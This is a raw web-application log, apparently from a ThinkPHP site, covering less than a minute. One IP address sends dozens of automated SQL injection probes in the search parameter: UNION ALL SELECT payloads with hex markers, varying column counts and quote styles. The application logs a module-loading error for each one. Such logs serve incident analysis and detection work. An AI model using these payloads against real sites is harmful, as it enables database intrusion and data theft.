[ 2015-12-17T11:33:37+08:00 ] 121.42.0.36 /?s=-1294%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001089s ]
INFO: [ app_init ] --END-- [ RunTime:0.001446s ]
ERR: 无法加载模块:-1294) UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:38+08:00 ] 121.42.0.36 /?s=-1717%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001488s ]
INFO: [ app_init ] --END-- [ RunTime:0.001874s ]
ERR: 无法加载模块:-1717) UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:38+08:00 ] 121.42.0.36 /?s=-1478%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001103s ]
INFO: [ app_init ] --END-- [ RunTime:0.001449s ]
ERR: 无法加载模块:-1478) UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:39+08:00 ] 121.42.0.36 /?s=-1247%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001146s ]
INFO: [ app_init ] --END-- [ RunTime:0.001513s ]
ERR: 无法加载模块:-1247) UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:40+08:00 ] 121.42.0.36 /?s=-1808%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001134s ]
INFO: [ app_init ] --END-- [ RunTime:0.001500s ]
ERR: 无法加载模块:-1808) UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:40+08:00 ] 121.42.0.36 /?s=-1993%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001963s ]
INFO: [ app_init ] --END-- [ RunTime:0.002484s ]
ERR: 无法加载模块:-1993) UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:41+08:00 ] 121.42.0.36 /?s=-1090%27%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001113s ]
INFO: [ app_init ] --END-- [ RunTime:0.001537s ]
ERR: 无法加载模块:-1090') UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:42+08:00 ] 121.42.0.36 /?s=-1631%27%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001177s ]
INFO: [ app_init ] --END-- [ RunTime:0.001527s ]
ERR: 无法加载模块:-1631') UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:42+08:00 ] 121.42.0.36 /?s=-1991%27%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001176s ]
INFO: [ app_init ] --END-- [ RunTime:0.001592s ]
ERR: 无法加载模块:-1991') UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:43+08:00 ] 121.42.0.36 /?s=-1464%27%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001164s ]
INFO: [ app_init ] --END-- [ RunTime:0.001574s ]
ERR: 无法加载模块:-1464') UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:44+08:00 ] 121.42.0.36 /?s=-1388%27%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001110s ]
INFO: [ app_init ] --END-- [ RunTime:0.001464s ]
ERR: 无法加载模块:-1388') UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:44+08:00 ] 121.42.0.36 /?s=-1306%27%29+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001121s ]
INFO: [ app_init ] --END-- [ RunTime:0.001470s ]
ERR: 无法加载模块:-1306') UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:45+08:00 ] 121.42.0.36 /?s=-1404%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001163s ]
INFO: [ app_init ] --END-- [ RunTime:0.001543s ]
ERR: 无法加载模块:-1404' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:45+08:00 ] 121.42.0.36 /?s=-1748%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001084s ]
INFO: [ app_init ] --END-- [ RunTime:0.001437s ]
ERR: 无法加载模块:-1748' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:46+08:00 ] 121.42.0.36 /?s=-1419%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001188s ]
INFO: [ app_init ] --END-- [ RunTime:0.001557s ]
ERR: 无法加载模块:-1419' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:47+08:00 ] 121.42.0.36 /?s=-1741%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001169s ]
INFO: [ app_init ] --END-- [ RunTime:0.001633s ]
ERR: 无法加载模块:-1741' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:47+08:00 ] 121.42.0.36 /?s=-1786%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001125s ]
INFO: [ app_init ] --END-- [ RunTime:0.001481s ]
ERR: 无法加载模块:-1786' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:48+08:00 ] 121.42.0.36 /?s=-1930%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001132s ]
INFO: [ app_init ] --END-- [ RunTime:0.001503s ]
ERR: 无法加载模块:-1930' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:49+08:00 ] 121.42.0.36 /?s=-1946%25%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001188s ]
INFO: [ app_init ] --END-- [ RunTime:0.001543s ]
ERR: 无法加载模块:-1946%' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:49+08:00 ] 121.42.0.36 /?s=-1714%25%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001060s ]
INFO: [ app_init ] --END-- [ RunTime:0.001404s ]
ERR: 无法加载模块:-1714%' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:50+08:00 ] 121.42.0.36 /?s=-1215%25%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001126s ]
INFO: [ app_init ] --END-- [ RunTime:0.001481s ]
ERR: 无法加载模块:-1215%' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:51+08:00 ] 121.42.0.36 /?s=-1810%25%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001082s ]
INFO: [ app_init ] --END-- [ RunTime:0.001431s ]
ERR: 无法加载模块:-1810%' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:51+08:00 ] 121.42.0.36 /?s=-1513%25%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.004362s ]
INFO: [ app_init ] --END-- [ RunTime:0.005091s ]
ERR: 无法加载模块:-1513%' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:52+08:00 ] 121.42.0.36 /?s=-1032%25%27+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001100s ]
INFO: [ app_init ] --END-- [ RunTime:0.001445s ]
ERR: 无法加载模块:-1032%' UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:53+08:00 ] 121.42.0.36 /?s=-1400+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001087s ]
INFO: [ app_init ] --END-- [ RunTime:0.001427s ]
ERR: 无法加载模块:-1400 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:53+08:00 ] 121.42.0.36 /?s=-1102+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001436s ]
INFO: [ app_init ] --END-- [ RunTime:0.001882s ]
ERR: 无法加载模块:-1102 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:54+08:00 ] 121.42.0.36 /?s=-1906+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001136s ]
INFO: [ app_init ] --END-- [ RunTime:0.001491s ]
ERR: 无法加载模块:-1906 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:55+08:00 ] 121.42.0.36 /?s=-1887+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000030s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001280s ]
INFO: [ app_init ] --END-- [ RunTime:0.001707s ]
ERR: 无法加载模块:-1887 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:55+08:00 ] 121.42.0.36 /?s=-1915+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001103s ]
INFO: [ app_init ] --END-- [ RunTime:0.001458s ]
ERR: 无法加载模块:-1915 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:56+08:00 ] 121.42.0.36 /?s=-1800+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001182s ]
INFO: [ app_init ] --END-- [ RunTime:0.001531s ]
ERR: 无法加载模块:-1800 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:57+08:00 ] 121.42.0.36 /?s=-1802+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001099s ]
INFO: [ app_init ] --END-- [ RunTime:0.001441s ]
ERR: 无法加载模块:-1802 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:57+08:00 ] 121.42.0.36 /?s=-1114+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001127s ]
INFO: [ app_init ] --END-- [ RunTime:0.001494s ]
ERR: 无法加载模块:-1114 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:58+08:00 ] 121.42.0.36 /?s=-1817+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001160s ]
INFO: [ app_init ] --END-- [ RunTime:0.001536s ]
ERR: 无法加载模块:-1817 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:59+08:00 ] 121.42.0.36 /?s=-1522+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001085s ]
INFO: [ app_init ] --END-- [ RunTime:0.001432s ]
ERR: 无法加载模块:-1522 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:33:59+08:00 ] 121.42.0.36 /?s=-1428+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001091s ]
INFO: [ app_init ] --END-- [ RunTime:0.001433s ]
ERR: 无法加载模块:-1428 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:34:00+08:00 ] 121.42.0.36 /?s=-1988+UNION+ALL+SELECT+CONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%2CCONCAT%280x7a5441457148%2C0x57434e735741%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001084s ]
INFO: [ app_init ] --END-- [ RunTime:0.001432s ]
ERR: 无法加载模块:-1988 UNION ALL SELECT CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741),CONCAT(0x7a5441457148,0x57434e735741)#

[ 2015-12-17T11:34:00+08:00 ] 121.42.0.36 /?s=-1246%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001176s ]
INFO: [ app_init ] --END-- [ RunTime:0.001561s ]
ERR: 无法加载模块:-1246) UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:01+08:00 ] 121.42.0.36 /?s=-1227%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001229s ]
INFO: [ app_init ] --END-- [ RunTime:0.001627s ]
ERR: 无法加载模块:-1227) UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:02+08:00 ] 121.42.0.36 /?s=-1782%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001105s ]
INFO: [ app_init ] --END-- [ RunTime:0.001453s ]
ERR: 无法加载模块:-1782) UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:02+08:00 ] 121.42.0.36 /?s=-1607%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001132s ]
INFO: [ app_init ] --END-- [ RunTime:0.001508s ]
